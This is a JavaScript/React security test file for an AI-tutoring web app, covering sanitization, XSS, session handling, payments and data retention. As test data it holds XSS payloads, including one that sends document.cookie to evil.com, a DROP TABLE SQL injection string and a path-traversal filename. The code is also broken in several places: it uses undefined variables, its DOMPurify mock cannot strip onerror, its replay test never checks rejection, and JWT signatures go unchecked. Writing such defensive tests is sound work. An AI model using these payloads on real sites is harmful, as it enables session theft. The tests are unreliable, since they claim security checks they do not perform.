import { describe, it, expect, vi, beforeEach, afterEach as _afterEach, beforeAll, afterAll } from 'vitest'
import { render, screen, fireEvent as _fireEvent, waitFor } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import React from 'react'
import AIChatInterface from '@/components/AIChatInterface'
import { LoginForm } from '@/components/auth/LoginForm'
import { PaymentProcessor } from '@/components/PaymentProcessor'
import DOMPurify from 'dompurify'
import { aiService } from '@/services/aiService'

// Mock AI Service with proper factory function
vi.mock('@/services/aiService', () => ({
  aiService: {
    sendMessage: vi.fn()
  }
}))

// Type the mocked service for better TypeScript support
const mockAiService = aiService as {
  sendMessage: ReturnType<typeof vi.fn>
}

// Mock DOMPurify
vi.mock('dompurify', () => ({
  default: {
    sanitize: vi.fn((input) => input.replace(/<script>/g, '').replace(/<\/script>/g, ''))
  }
}))

// Mock CSP violations
const mockCSPViolations = []
const originalAddEventListener = globalThis.addEventListener

beforeAll(() => {
  globalThis.addEventListener = vi.fn((event, handler) => {
    if (event === 'securitypolicyviolation') {
      mockCSPViolations.push(handler)
    }
    return originalAddEventListener?.call(globalThis, event, handler)
  })
})

afterAll(() => {
  globalThis.addEventListener = originalAddEventListener
})

describe('Security Tests', () => {
  beforeEach(() => {
    vi.clearAllMocks()
    mockCSPViolations.length = 0
  })

  describe('Input Sanitization', () => {
    it('should sanitize HTML input in chat messages', async () => {
      const user = userEvent.setup()
      
      mockAiService.sendMessage.mockResolvedValue({
        id: 'response-1',
        content: 'Safe response',
        role: 'assistant',
        timestamp: new Date().toISOString()
      })

      render(<AIChatInterface assistantId="math_tutor" />)

      const messageInput = screen.getByPlaceholderText(/digite sua pergunta/i)
      const sendButton = screen.getByRole('button', { name: /enviar/i })

      // Test XSS attempt
      const maliciousInput = '<script>alert("XSS")</script><img src="x" onerror="alert(\'XSS\')">'
      
      await user.type(messageInput, maliciousInput)
      await user.click(sendButton)

      // Should sanitize the input before sending
      expect(DOMPurify.sanitize).toHaveBeenCalledWith(maliciousInput)
      expect(mockSendMessage).toHaveBeenCalledWith({
        content: expect.not.stringContaining('<script>'),
        assistantId: 'math_tutor'
      })
    })

    it('should prevent SQL injection in form inputs', async () => {
      const user = userEvent.setup()
      
      const mockLogin = vi.fn()
      
      vi.mock('@/contexts/AuthContext', () => ({
        useAuth: () => ({
          login: mockLogin,
          isLoading: false,
          error: null
        })
      }))

      render(<LoginForm onSuccess={vi.fn()} />)

      const emailInput = screen.getByLabelText(/email/i)
      const passwordInput = screen.getByLabelText(/password/i)
      const submitButton = screen.getByRole('button', { name: /entrar/i })

      // Test SQL injection attempt
      const sqlInjection = "admin'; DROP TABLE users; --"
      
      await user.type(emailInput, sqlInjection)
      await user.type(passwordInput, 'password')
      await user.click(submitButton)

      // Should validate and sanitize input
      const loginCall = mockLogin.mock.calls[0]
      expect(loginCall[0].email).not.toContain('DROP TABLE')
      expect(loginCall[0].email).toMatch(/^[^';]+$/) // No SQL injection characters
    })

    it('should validate and sanitize file uploads', async () => {
      const user = userEvent.setup()
      
      const FileUploadComponent = () => {
        const [file, setFile] = React.useState(null)
        const [error, setError] = React.useState('')

        const handleFileUpload = (event) => {
          const selectedFile = event.target.files[0]
          
          // Security validation
          const allowedTypes = ['image/png', 'image/jpeg', 'text/plain']
          const maxSize = 5 * 1024 * 1024 // 5MB
          
          if (!allowedTypes.includes(selectedFile.type)) {
            setError('Tipo de arquivo não permitido')
            return
          }
          
          if (selectedFile.size > maxSize) {
            setError('Arquivo muito grande')
            return
          }
          
          // Check for malicious filename
          if (/[<>:"/\\|?*]/.test(selectedFile.name)) {
            setError('Nome de arquivo inválido')
            return
          }
          
          setFile(selectedFile)
          setError('')
        }

        return (
          <div>
            <input
              type="file"
              onChange={handleFileUpload}
              data-testid="file-input"
            />
            {error && <div data-testid="file-error">{error}</div>}
            {file && <div data-testid="file-success">File uploaded: {file.name}</div>}
          </div>
        )
      }

      render(<FileUploadComponent />)

      const fileInput = screen.getByTestId('file-input')

      // Test malicious filename
      const maliciousFile = new File(['content'], '../../../etc/passwd', { type: 'text/plain' })
      
      await user.upload(fileInput, maliciousFile)
      
      expect(screen.getByTestId('file-error'))
        .toHaveTextContent('Nome de arquivo inválido')

      // Test valid file
      const validFile = new File(['content'], 'document.txt', { type: 'text/plain' })
      
      await user.upload(fileInput, validFile)
      
      expect(screen.getByTestId('file-success'))
        .toHaveTextContent('File uploaded: document.txt')
    })
  })

  describe('XSS Prevention', () => {
    it('should prevent stored XSS in user content', async () => {
      const maliciousContent = {
        userMessage: '<script>fetch("/api/steal-data", {method: "POST", body: document.cookie})</script>',
        aiResponse: '<img src="x" onerror="window.location=\'http://evil.com?cookie=\'+document.cookie">'
      }

      const ConversationDisplay = ({ messages }) => {
        return (
          <div data-testid="conversation">
            {messages.map((msg, i) => (
              <div 
                key={i}
                dangerouslySetInnerHTML={{ 
                  __html: DOMPurify.sanitize(msg.content) 
                }}
              />
            ))}
          </div>
        )
      }

      render(
        <ConversationDisplay 
          messages={[
            { content: maliciousContent.userMessage, role: 'user' },
            { content: maliciousContent.aiResponse, role: 'assistant' }
          ]}
        />
      )

      const conversation = screen.getByTestId('conversation')
      
      // Should not contain script tags or malicious event handlers
      expect(conversation.innerHTML).not.toContain('<script>')
      expect(conversation.innerHTML).not.toContain('onerror')
      expect(conversation.innerHTML).not.toContain('javascript:')
    })

    it('should prevent DOM-based XSS from URL parameters', () => {
      // Mock location with malicious hash
      delete window.location
      window.location = {
        hash: '#<script>alert("XSS")</script>',
        search: '?redirect=javascript:alert("XSS")'
      }

      const URLParamComponent = () => {
        const [content, setContent] = React.useState('')

        React.useEffect(() => {
          // Simulate reading from URL (common XSS vector)
          const urlContent = decodeURIComponent(window.location.hash.slice(1))
          
          // Should sanitize before setting
          setContent(DOMPurify.sanitize(urlContent))
        }, [])

        return <div data-testid="url-content">{content}</div>
      }

      render(<URLParamComponent />)

      const content = screen.getByTestId('url-content')
      expect(content.textContent).not.toContain('<script>')
      expect(DOMPurify.sanitize).toHaveBeenCalled()
    })

    it('should implement Content Security Policy violations detection', () => {
      const CSPMonitor = () => {
        const [violations, setViolations] = React.useState([])

        React.useEffect(() => {
          const handleCSPViolation = (event) => {
            setViolations(prev => [...prev, {
              directive: event.violatedDirective,
              blockedURI: event.blockedURI,
              timestamp: new Date().toISOString()
            }])
          }

          document.addEventListener('securitypolicyviolation', handleCSPViolation)
          
          return () => {
            document.removeEventListener('securitypolicyviolation', handleCSPViolation)
          }
        }, [])

        return (
          <div>
            <div data-testid="violation-count">{violations.length} violations</div>
            {violations.map((violation, i) => (
              <div key={i} data-testid="violation">
                {violation.directive}: {violation.blockedURI}
              </div>
            ))}
          </div>
        )
      }

      render(<CSPMonitor />)

      // Simulate CSP violation
      const mockViolation = {
        violatedDirective: 'script-src',
        blockedURI: 'eval',
        preventDefault: vi.fn()
      }

      mockCSPViolations.forEach(handler => handler(mockViolation))

      expect(screen.getByTestId('violation-count'))
        .toHaveTextContent('1 violations')
      expect(screen.getByTestId('violation'))
        .toHaveTextContent('script-src: eval')
    })
  })

  describe('Authentication Security', () => {
    it('should implement secure session management', async () => {
      const SessionManager = () => {
        const [sessionData, setSessionData] = React.useState(null)

        React.useEffect(() => {
          // Simulate secure session validation
          const token = localStorage.getItem('auth_token')
          
          if (token) {
            try {
              // Basic JWT structure validation
              const parts = token.split('.')
              if (parts.length !== 3) {
                throw new Error('Invalid token format')
              }
              
              // Decode payload (in real app, verify signature)
              const payload = JSON.parse(atob(parts[1]))
              
              // Check expiration
              if (payload.exp && payload.exp < Date.now() / 1000) {
                throw new Error('Token expired')
              }
              
              setSessionData({ valid: true, user: payload.user })
            } catch (error) {
              localStorage.removeItem('auth_token')
              setSessionData({ valid: false, error: error.message })
            }
          }
        }, [])

        return (
          <div>
            {sessionData?.valid ? (
              <div data-testid="session-valid">Session valid</div>
            ) : (
              <div data-testid="session-invalid">
                {sessionData?.error || 'No session'}
              </div>
            )}
          </div>
        )
      }

      // Test with expired token
      const expiredToken = btoa(JSON.stringify({ 
        header: { alg: 'HS256', typ: 'JWT' } 
      })) + '.' + btoa(JSON.stringify({ 
        user: 'test', 
        exp: Math.floor(Date.now() / 1000) - 3600 // Expired 1 hour ago
      })) + '.signature'

      localStorage.setItem('auth_token', expiredToken)

      render(<SessionManager />)

      expect(screen.getByTestId('session-invalid'))
        .toHaveTextContent('Token expired')
    })

    it('should prevent session fixation attacks', async () => {
      const user = userEvent.setup()
      
      const mockLogin = vi.fn().mockImplementation(async (_credentials) => {
        // Simulate successful login with new session ID
        const newSessionId = 'new-session-' + Math.random()
        localStorage.setItem('session_id', newSessionId)
        return { success: true, sessionId: newSessionId }
      })

      vi.mock('@/contexts/AuthContext', () => ({
        useAuth: () => ({
          login: mockLogin,
          isLoading: false,
          error: null
        })
      }))

      // Set initial session ID (potentially from attacker)
      const initialSessionId = 'attacker-session-123'
      localStorage.setItem('session_id', initialSessionId)

      render(<LoginForm onSuccess={vi.fn()} />)

      const emailInput = screen.getByLabelText(/email/i)
      const passwordInput = screen.getByLabelText(/password/i)
      const submitButton = screen.getByRole('button', { name: /entrar/i })

      await user.type(emailInput, 'test@example.com')
      await user.type(passwordInput, 'password')
      await user.click(submitButton)

      await waitFor(() => {
        expect(mockLogin).toHaveBeenCalled()
      })

      // Session ID should change after login (prevent session fixation)
      const newSessionId = localStorage.getItem('session_id')
      expect(newSessionId).not.toBe(initialSessionId)
      expect(newSessionId).toMatch(/^new-session-/)
    })

    it('should implement rate limiting for login attempts', async () => {
      const user = userEvent.setup()
      
      let attemptCount = 0
      const mockLogin = vi.fn().mockImplementation(() => {
        attemptCount++
        if (attemptCount > 3) {
          throw new Error('Too many login attempts. Please try again later.')
        }
        throw new Error('Invalid credentials')
      })

      vi.mock('@/contexts/AuthContext', () => ({
        useAuth: () => ({
          login: mockLogin,
          isLoading: false,
          error: null
        })
      }))

      render(<LoginForm onSuccess={vi.fn()} />)

      const emailInput = screen.getByLabelText(/email/i)
      const passwordInput = screen.getByLabelText(/password/i)
      const submitButton = screen.getByRole('button', { name: /entrar/i })

      // Attempt multiple logins
      for (let i = 0; i < 5; i++) {
        await user.clear(emailInput)
        await user.clear(passwordInput)
        await user.type(emailInput, 'test@example.com')
        await user.type(passwordInput, 'wrongpassword')
        await user.click(submitButton)
        
        await new Promise(resolve => setTimeout(resolve, 100))
      }

      await waitFor(() => {
        expect(screen.getByText(/too many login attempts/i)).toBeInTheDocument()
      })

      // Login should be disabled after rate limit
      expect(submitButton).toBeDisabled()
    })
  })

  describe('Payment Security', () => {
    it('should validate payment data integrity', async () => {
      const user = userEvent.setup()
      
      const mockProcessPayment = vi.fn()
      
      vi.mock('@/services/creditApi', () => ({
        creditApi: {
          processPayment: mockProcessPayment,
          getPaymentMethods: vi.fn().mockResolvedValue([
            { id: 'credit-10', name: '10 Créditos', price: 18.99, credits: 10 }
          ])
        }
      }))

      render(<PaymentProcessor />)

      // Try to manipulate price in DOM
      const packageElement = screen.getByText('R$ 18,99')
      packageElement.textContent = 'R$ 1,00' // Client-side manipulation

      const packageButton = screen.getByText('10 Créditos').closest('button')
      await user.click(packageButton!)

      const continueButton = screen.getByRole('button', { name: /continuar/i })
      await user.click(continueButton)

      const payButton = screen.getByRole('button', { name: /pagar/i })
      await user.click(payButton)

      // Should send original server-side price, not manipulated value
      expect(mockProcessPayment).toHaveBeenCalledWith(
        expect.objectContaining({
          packageId: 'credit-10',
          expectedAmount: 18.99 // Original price, not manipulated
        })
      )
    })

    it('should implement secure payment tokenization', async () => {
      const mockStripe = {
        createToken: vi.fn().mockResolvedValue({
          token: {
            id: 'tok_secure_token_123',
            card: {
              last4: '4242',
              brand: 'visa'
            }
          }
        })
      }

      vi.mock('@stripe/stripe-js', () => ({
        loadStripe: vi.fn(() => Promise.resolve(mockStripe))
      }))

      const PaymentForm = () => {
        const [cardData, setCardData] = React.useState({
          number: '',
          expiry: '',
          cvc: ''
        })
        const [token, setToken] = React.useState(null)

        const handleSubmit = async () => {
          // Should use tokenization, never send raw card data
          const result = await mockStripe.createToken(cardData)
          setToken(result.token)
          
          // Clear sensitive data immediately
          setCardData({ number: '', expiry: '', cvc: '' })
        }

        return (
          <div>
            <input
              data-testid="card-number"
              value={cardData.number}
              onChange={(e) => setCardData(prev => ({ ...prev, number: e.target.value }))}
              placeholder="Card Number"
            />
            <button onClick={handleSubmit} data-testid="tokenize">
              Tokenize
            </button>
            {token && (
              <div data-testid="token">Token: {token.id}</div>
            )}
          </div>
        )
      }

      render(<PaymentForm />)

      const cardInput = screen.getByTestId('card-number')
      const tokenizeButton = screen.getByTestId('tokenize')

      await user.type(cardInput, '4242424242424242')
      await user.click(tokenizeButton)

      await waitFor(() => {
        expect(screen.getByTestId('token'))
          .toHaveTextContent('Token: tok_secure_token_123')
      })

      // Sensitive data should be cleared
      expect(cardInput.value).toBe('')
    })

    it('should prevent payment replay attacks', async () => {
      const user = userEvent.setup()
      
      const paymentRequests = []
      const mockProcessPayment = vi.fn().mockImplementation((data) => {
        // Check for duplicate nonce
        const existingRequest = paymentRequests.find(req => req.nonce === data.nonce)
        if (existingRequest) {
          throw new Error('Duplicate payment request')
        }
        
        paymentRequests.push(data)
        return Promise.resolve({ success: true })
      })

      const PaymentComponent = () => {
        const [nonce] = React.useState(() => 
          'payment-' + Date.now() + '-' + Math.random()
        )

        const handlePay = () => {
          mockProcessPayment({
            amount: 18.99,
            packageId: 'credit-10',
            nonce
          })
        }

        return (
          <button onClick={handlePay} data-testid="pay-button">
            Pay
          </button>
        )
      }

      render(<PaymentComponent />)

      const payButton = screen.getByTestId('pay-button')

      // First payment should succeed
      await user.click(payButton)
      expect(mockProcessPayment).toHaveBeenCalledTimes(1)

      // Second identical payment should fail (replay attack)
      await user.click(payButton)
      
      expect(mockProcessPayment).toHaveBeenCalledTimes(2)
      expect(mockProcessPayment).toHaveBeenLastCalledWith(
        expect.objectContaining({
          nonce: expect.any(String)
        })
      )
    })
  })

  describe('Data Protection', () => {
    it('should implement secure data transmission', async () => {
      // Mock HTTPS check
      Object.defineProperty(window.location, 'protocol', {
        value: 'https:',
        writable: true
      })

      const SecureDataComponent = () => {
        const [isSecure, setIsSecure] = React.useState(false)

        React.useEffect(() => {
          // Check if connection is secure
          const isHTTPS = window.location.protocol === 'https:'
          const hasSecureContext = window.isSecureContext
          
          setIsSecure(isHTTPS && hasSecureContext)
        }, [])

        return (
          <div>
            {isSecure ? (
              <div data-testid="secure-connection">Secure connection verified</div>
            ) : (
              <div data-testid="insecure-warning">
                Insecure connection detected. Please use HTTPS.
              </div>
            )}
          </div>
        )
      }

      render(<SecureDataComponent />)

      expect(screen.getByTestId('secure-connection'))
        .toHaveTextContent('Secure connection verified')
    })

    it('should implement data minimization', async () => {
      const DataCollectionForm = () => {
        const [userData, setUserData] = React.useState({
          // Minimal required data only
          email: '',
          grade: '',
          subjects: []
        })

        const handleSubmit = () => {
          // Should only collect necessary data
          const dataToSend = {
            email: userData.email,
            grade: userData.grade,
            subjects: userData.subjects
            // No sensitive data like passwords or personal details
          }

          // Validate no sensitive data is being sent
          const sensitiveFields = ['password', 'ssn', 'creditCard']
          const hasSensitiveData = sensitiveFields.some(field => 
            JSON.stringify(dataToSend).includes(field)
          )

          if (hasSensitiveData) {
            throw new Error('Sensitive data detected in transmission')
          }
        }

        return (
          <form onSubmit={handleSubmit}>
            <input
              data-testid="email-input"
              value={userData.email}
              onChange={(e) => setUserData(prev => ({ ...prev, email: e.target.value }))}
              placeholder="Email"
            />
            <button type="submit" data-testid="submit">Submit</button>
          </form>
        )
      }

      render(<DataCollectionForm />)

      const emailInput = screen.getByTestId('email-input')
      const submitButton = screen.getByTestId('submit')

      await user.type(emailInput, 'test@example.com')
      await user.click(submitButton)

      // Should not throw error for minimal data collection
      expect(screen.getByTestId('submit')).toBeInTheDocument()
    })

    it('should implement proper data retention policies', () => {
      const DataRetentionManager = () => {
        const [retentionStatus, setRetentionStatus] = React.useState('')

        React.useEffect(() => {
          // Simulate data retention check
          const userData = localStorage.getItem('user_data')
          if (userData) {
            const data = JSON.parse(userData)
            const creationDate = new Date(data.createdAt)
            const retentionPeriod = 365 * 24 * 60 * 60 * 1000 // 1 year
            const now = new Date()

            if (now.getTime() - creationDate.getTime() > retentionPeriod) {
              // Data should be purged
              localStorage.removeItem('user_data')
              setRetentionStatus('Data expired and removed')
            } else {
              setRetentionStatus('Data within retention period')
            }
          }
        }, [])

        return (
          <div data-testid="retention-status">
            {retentionStatus}
          </div>
        )
      }

      // Set up old data
      const oldData = {
        email: 'old@example.com',
        createdAt: new Date(Date.now() - 400 * 24 * 60 * 60 * 1000) // 400 days ago
      }
      localStorage.setItem('user_data', JSON.stringify(oldData))

      render(<DataRetentionManager />)

      expect(screen.getByTestId('retention-status'))
        .toHaveTextContent('Data expired and removed')

      // Data should be removed from localStorage
      expect(localStorage.getItem('user_data')).toBeNull()
    })
  })
})